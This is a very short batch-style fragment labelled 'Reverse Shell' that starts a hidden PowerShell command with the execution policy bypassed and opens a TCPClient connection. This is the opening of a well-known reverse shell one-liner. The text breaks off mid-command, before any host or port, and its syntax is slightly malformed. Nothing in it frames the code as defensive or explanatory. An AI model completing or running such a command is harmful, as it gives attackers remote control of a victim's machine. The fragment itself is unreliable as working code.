@echo off;
#REM Reverse Shell
PowerShell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("